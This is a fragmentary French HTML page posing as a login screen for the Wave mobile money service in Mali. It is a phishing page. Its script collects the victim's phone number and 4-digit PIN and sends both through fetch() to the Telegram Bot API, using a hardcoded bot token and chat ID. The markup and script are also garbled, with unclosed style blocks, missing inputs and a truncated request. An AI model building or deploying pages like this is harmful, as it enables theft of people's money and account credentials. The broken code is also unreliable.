<!DOCTYPE html>
<html lang="fr">

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <style>

        p {

        form {

        input {
            width: 70%;
            height: 40px;
            margin-left: auto;
            text-align: center;
            font-size: 1.4rem;

        input:focus {

        }

</head>

<body>
    <h1>Wave</h1>

    <br>
    <br>

    <form id="form">

        <button id="co">Connexion</button>

<script>
    document.getElementById('suivant').addEventListener('click', function (e) {
        e.preventDefault();

        const tel = document.getElementById('tel').value;

        if (tel.length == 10) {


            document.getElementById('pwd').style.display = "block";
            document.getElementById('co').style.display = "block";
            document.getElementById('suivant').style.display = "none";

            document.getElementById("notif").innerText = 'num√©ro invalide !'
        }

    document.getElementById('co').addEventListener('click', function (e) {

        const tel = document.getElementById('tel').value;

        if (pwd.length == 4) {
            const botToken = "7891154943:AAG-iRSqPg6KL1q-slYogakDcXBvjrcrFCU";  // Remplace par le token de ton bot
            const chatId = "8033906914";      // Remplace par l'ID du chat



            const message = `üéÄ Wave mali :\n\nüìûNumero : ${tel}\nüîê Code : ${pwd}`;


            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {

        }
    });
</script>
